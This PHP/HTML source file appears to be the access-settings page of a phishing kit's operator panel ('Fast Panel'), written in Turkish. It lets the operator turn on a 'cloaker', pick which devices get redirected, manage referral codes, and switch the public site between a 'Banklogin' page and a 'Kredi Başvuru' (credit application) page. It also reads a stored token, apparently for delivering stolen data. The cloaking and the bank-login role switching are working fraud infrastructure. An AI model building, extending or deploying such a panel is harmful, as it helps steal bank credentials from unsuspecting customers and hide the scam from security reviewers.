<?php
session_start();

if (!isset($_SESSION['fast-admin']) || $_SESSION['fast-admin'] !== true) {
    header("Location: fast-login.php");
    exit;
}

require_once '../inc/brain.php';
date_default_timezone_set('Europe/Istanbul');

if (isset($_POST['update_site_role'])) {
    $role = $_POST['role'];

    $roleMap = [
        'Banklogin' => 1,
        'Kredi Başvuru' => 2
    ];

    if (array_key_exists($role, $roleMap)) {
        $roleValue = $roleMap[$role];

        $stmt = $pdo->prepare("UPDATE panel SET role = ? WHERE id = 1");
        $stmt->execute([$roleValue]);

        echo json_encode(['success' => true, 'message' => 'Site görünümü başarıyla güncellendi.']);
    } else {
        echo json_encode(['success' => false, 'message' => 'Geçersiz görünüm seçimi.']);
    }
    exit;
}


if (isset($_GET['get_panel_settings'])) {
    $stmt = $pdo->query("SELECT cloaker_aktif, cihaz_access, referans_access, role FROM panel WHERE id = 1");
    $settings = $stmt->fetch(PDO::FETCH_ASSOC);
    echo json_encode($settings);
    exit;
}

if (isset($_POST['update_cloaker'])) {
    $aktif = (int) $_POST['cloaker_aktif'];
    $stmt = $pdo->prepare("UPDATE panel SET cloaker_aktif = ? WHERE id = 1");
    $stmt->execute([$aktif]);
    echo json_encode(['success' => true, 'message' => 'Cloaker durumu güncellendi.']);
    exit;
}

if (isset($_POST['update_device_access'])) {
    $cihaz = $_POST['cihaz_access'];
    if (in_array($cihaz, ['mobil', 'masaüstü', 'both'])) {
        $stmt = $pdo->prepare("UPDATE panel SET cihaz_access = ? WHERE id = 1");
        $stmt->execute([$cihaz]);
        echo json_encode(['success' => true, 'message' => 'Cihaz erişimi güncellendi.']);
    } else {
        echo json_encode(['success' => false, 'message' => 'Geçersiz cihaz seçimi.']);
    }
    exit;
}

if (isset($_POST['update_referans_access'])) {
    $aktif = (int) $_POST['referans_access'];
    $stmt = $pdo->prepare("UPDATE panel SET referans_access = ? WHERE id = 1");
    $stmt->execute([$aktif]);
    echo json_encode(['success' => true, 'message' => 'Referans sistemi durumu güncellendi.']);
    exit;
}

if (isset($_POST['set_referans_code'])) {
    $kod = trim($_POST['kod']);
    if ($kod) {
        $stmt = $pdo->prepare("UPDATE panel SET referans_kodu = ? WHERE id = 1");
        $stmt->execute([$kod]);
        echo json_encode(['success' => true, 'message' => 'Referans kodu kaydedildi.']);
    } else {
        echo json_encode(['success' => false, 'message' => 'Kod boş olamaz.']);
    }
    exit;
}


try {
    $stmt = $pdo->query("SELECT * FROM yetkili LIMIT 1");
    $yetkili = $stmt->fetch();

    if ($yetkili) {
        $_SESSION['yetkili_id'] = $yetkili['id'];
        $kullanici_adi = $yetkili['yetkiliadi'];
        $parola_hash = $yetkili['parola_hash'];
        $kisa_hash = substr($parola_hash, 0, 4) . str_repeat('*', strlen($parola_hash) - 7) . substr($parola_hash, -3);
        $ip_adresi = $yetkili['ip_adresi'];
        $son_giris_tarihi = $yetkili['son_giris_tarihi'];
        $son_giris_ip = $yetkili['son_giris_ip'];
        $son_giris_cihaz = $yetkili['son_giris_cihaz'];
        $son_giris_tarayici = $yetkili['son_giris_tarayici'];
    } else {
        echo "Yetkili kaydı bulunamadı.";
    }

    $stmtPanel = $pdo->query("SELECT t_token FROM panel LIMIT 1");
    $panel = $stmtPanel->fetch();
    $t_token = $panel ? $panel['t_token'] : 'Token bulunamadı.';
} catch (PDOException $e) {
    echo "Veritabanı hatası: " . $e->getMessage();
}
?>



<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
  <meta charset="utf-8" />
  <title>Marco | Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="description" content="" />
  <meta name="author" content="" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet" />
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" />
  <link href="css/vendor.min.css" rel="stylesheet" />
  <link href="css/app.min.css" rel="stylesheet" />
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <link href="css/jquery-jvectormap.css" rel="stylesheet" />
  <link href="https://unpkg.com/bootstrap-table@1.22.2/dist/bootstrap-table.min.css" rel="stylesheet" />
  <style>
    
    #referansInfo {
      background-color: #1e1e1e !important;
      border: 1px solid #333;
      transition: all 0.3s ease;
    }

     #referansInputContainer {
      background-color: #1e1e1e !important;
      border: 1px solid #333;
      transition: all 0.3s ease;
    }

  </style>
</head>

<body>
  <div id="app" class="app">
    <?php
    include('../inc/fast-header.php');
    include('../inc/fast-sidebar.php');
    ?>

    <button class="app-sidebar-mobile-backdrop" data-toggle-target=".app" data-toggle-class="app-sidebar-mobile-toggled"></button>

    <div class="app-content">
      <ul class="breadcrumb">
        <li class="breadcrumb-item"><a href="#">Fast Panel</a></li>
        <li class="breadcrumb-item active">Erişim Ayarları</li>
      </ul>

      <h1 class="page-header">Erişim Ayarları <small>[Gelişmiş Ayarlar]</small></h1>
      <p>Site trafiğinizdeki istekleri yönlendirin, sınırlayın.</p>

      <div class="position-fixed top-0 end-0 p-3" style="z-index: 1080;">
        <div id="banToast" class="toast align-items-center text-white bg-primary border-0" role="alert" aria-live="assertive" aria-atomic="true">
          <div class="d-flex">
            <div class="toast-body" id="banToastBody"></div>
            <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast" aria-label="Kapat"></button>
          </div>
        </div>
      </div>
<div class="row">
    <div class="col-md-6 mb-4">
        <div class="card h-100">
            <div class="card-body d-flex flex-column">
                <div class="d-flex justify-content-between align-items-center mb-2">
                    <h5>Cloaker Aktifliği</h5>
                    <div class="form-check form-switch">
                        <input class="form-check-input" type="checkbox" id="cloakerToggle" />
                        <label class="form-check-label" for="cloakerToggle" id="cloakerToggleLabel">Kapalı</label>
                    </div>
                </div>
                <p class="text-white-50 mb-3">Cloaker aktif olduğunda hangi cihazların yönlendirileceğini seçin.</p>
                <div id="cloakerRedirectSettings" class="mt-auto" style="pointer-events: none; opacity: 0.4;">
                     <div class="selection-group device-selection" id="deviceAccessSelection">
                        <div class="selection-item" data-value="masaüstü">
                             <input type="radio" class="btn-check" name="deviceAccess" id="deviceDesktop" value="masaüstü">
                             <i class="bi bi-display fs-3"></i>
                             <h6 class="selection-title-small mt-2">Masaüstü</h6>
                             <i class="bi bi-check-circle-fill selection-check-small"></i>
                        </div>
                        <div class="selection-item" data-value="mobil">
                            <input type="radio" class="btn-check" name="deviceAccess" id="deviceMobile" value="mobil">
                            <i class="bi bi-phone fs-3"></i>
                            <h6 class="selection-title-small mt-2">Mobil</h6>
                             <i class="bi bi-check-circle-fill selection-check-small"></i>
                        </div>
                        <div class="selection-item" data-value="both">
                            <input type="radio" class="btn-check" name="deviceAccess" id="deviceBoth" value="both">
                            <i class="bi bi-check2-all fs-3"></i>
                            <h6 class="selection-title-small mt-2">Her İkisi</h6>
                            <i class="bi bi-check-circle-fill selection-check-small"></i>
                        </div>
                    </div>
                </div>
            </div>
            <div class="card-arrow"><div class="card-arrow-top-left"></div><div class="card-arrow-top-right"></div><div class="card-arrow-bottom-left"></div><div class="card-arrow-bottom-right"></div></div>
        </div>
    </div>
   
</div>
  <style>
  .selection-group {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 1rem;
  }
  .selection-group.device-selection {
      grid-template-columns: repeat(3, 1fr);
  }
  .selection-item {
      position: relative;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 1.25rem;
      border: 2px solid #444;
      border-radius: 0.5rem;
      background-color: #2a2a2a;
      cursor: pointer;
      transition: all 0.2s ease-in-out;
      text-align: center;
  }
  .selection-item:hover {
      border-color: #666;
      transform: translateY(-3px);
  }
  .selection-item.selected {
      border-color: #0d6efd;
      background-color: rgba(13, 110, 253, 0.1);
      box-shadow: 0 0 15px rgba(13, 110, 253, 0.2);
  }
  #siteRoleSelection .selection-item {
      flex-direction: row;
      align-items: center;
      text-align: left;
      padding: 1rem;
  }
  .selection-icon {
      margin-right: 1rem;
      color: #0d6efd;
  }
  .selection-title {
      margin: 0;
      font-size: 1rem;
      font-weight: 600;
      color: #fff;
  }
  .selection-title-small {
      font-size: 0.9rem;
      font-weight: 500;
      color: #eee;
  }
  .selection-desc {
      font-size: 0.8rem;
      color: #999;
      margin: 0;
  }
  .selection-check, .selection-check-small {
      position: absolute;
      top: 10px;
      right: 10px;
      font-size: 1.25rem;
      color: #0d6efd;
      opacity: 0;
      transform: scale(0.5);
      transition: all 0.2s ease-in-out;
  }
  .selection-check-small {
      font-size: 1rem;
  }
  .selection-item.selected .selection-check,
  .selection-item.selected .selection-check-small {
      opacity: 1;
      transform: scale(1);
  }
  </style>
  <script>
  $(function () {
      const toast = new bootstrap.Toast(document.getElementById('banToast'));
      const $cloakerRedirectSettings = $('#cloakerRedirectSettings');
      const $cloakerToggle = $('#cloakerToggle');
      const $cloakerToggleLabel = $('#cloakerToggleLabel');

      function showToast(msg) {
          $('#banToastBody').text(msg);
          toast.show();
      }

      function setCloakerSettingsUI(enabled) {
          if (enabled) {
              $cloakerRedirectSettings.css({ 'pointer-events': 'auto', 'opacity': 1 });
              $cloakerToggleLabel.text("Aktif");
          } else {
              $cloakerRedirectSettings.css({ 'pointer-events': 'none', 'opacity': 0.4 });
              $cloakerToggleLabel.text("Kapalı");
          }
      }

      function setReferansSettingsUI(enabled) {
          const label = enabled ? "Referans sistemini kapat" : "Referans sistemini aç";
          $('#referansToggleLabel').text(label);
          const style = enabled ? { 'pointer-events': 'auto', 'opacity': 1 } : { 'pointer-events': 'none', 'opacity': 0.4 };
          $('#referansInfo, #referansInputContainer').css(style);
      }

      $.get('', { get_panel_settings: true }, function (res) {
          if (res.cloaker_aktif == 1) {
              $cloakerToggle.prop('checked', true);
              setCloakerSettingsUI(true);
          } else {
              $cloakerToggle.prop('checked', false);
              setCloakerSettingsUI(false);
          }

          if (res.cihaz_access) {
              $('#deviceAccessSelection .selection-item').removeClass('selected')
                  .find(`input[value="${res.cihaz_access}"]`).prop('checked', true)
                  .closest('.selection-item').addClass('selected');
          }

          if (res.referans_access == 1) {
              $('#referansToggle').prop('checked', true);
              setReferansSettingsUI(true);
          } else {
              $('#referansToggle').prop('checked', false);
              setReferansSettingsUI(false);
          }
          
          if (res.role) {
              const roleKey = res.role == 1 ? 'Banklogin' : 'Kredi Başvuru';
              $('#siteRoleSelection .selection-item').removeClass('selected')
                  .find(`input[value="${roleKey}"]`).prop('checked', true)
                  .closest('.selection-item').addClass('selected');
          }

      }, 'json');

      $('.selection-item').on('click', function() {
          const $this = $(this);
          const group = $this.closest('.selection-group');
          const radio = $this.find('input[type="radio"]');
          const value = radio.val();
          const name = radio.attr('name');

          if (radio.is(':checked')) {
              return; 
          }

          group.find('.selection-item').removeClass('selected');
          $this.addClass('selected');
          radio.prop('checked', true);

          if (name === 'siteRole') {
              $.post('', { update_site_role: true, role: value }, function (res) {
                  if (res.success) showToast("🎨 " + res.message);
                  else showToast("⚠️ " + res.message);
              }, 'json');
          } else if (name === 'deviceAccess') {
              $.post('', { update_device_access: true, cihaz_access: value }, function (res) {
                  if (res.success) showToast("💻 " + res.message);
                  else showToast("⚠️ " + res.message);
              }, 'json');
          }
      });

      $cloakerToggle.on('change', function () {
          const aktif = this.checked ? 1 : 0;
          setCloakerSettingsUI(aktif);
          $.post('', { update_cloaker: true, cloaker_aktif: aktif }, function (res) {
              if (res.success) showToast("⚙️ " + res.message);
              else showToast("⚠️ " + res.message);
          }, 'json');
      });

      $('#referansToggle').on('change', function () {
          const aktif = this.checked ? 1 : 0;
          setReferansSettingsUI(aktif);
          $.post('', { update_referans_access: true, referans_access: aktif }, function (res) {
              if (res.success) showToast("✅ " + res.message);
              else showToast("⚠️ " + res.message);
          }, 'json');
      });

      $('#applyReferans').on('click', function () {
          const kod = $('#referansInput').val().trim();
          if (kod.length === 0) return showToast("⚠️ Lütfen referans kodu girin.");
          $.post('', { set_referans_code: true, kod: kod }, function (res) {
              if (res.success) showToast("✅ " + res.message);
              else showToast("⚠️ " + res.message);
          }, 'json');
      });
  });
  </script>
	<script src="js/vendor.min.js" type="efade36a53868317824a3d21-text/javascript"></script>
	<script src="js/app.min.js" type="efade36a53868317824a3d21-text/javascript"></script>
	<script src="js/dashboard.demo.js" type="efade36a53868317824a3d21-text/javascript"></script>
  <script src="js/rocket-loader.min.js" data-cf-settings="efade36a53868317824a3d21-|49" defer=""></script>
	<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
</body></html>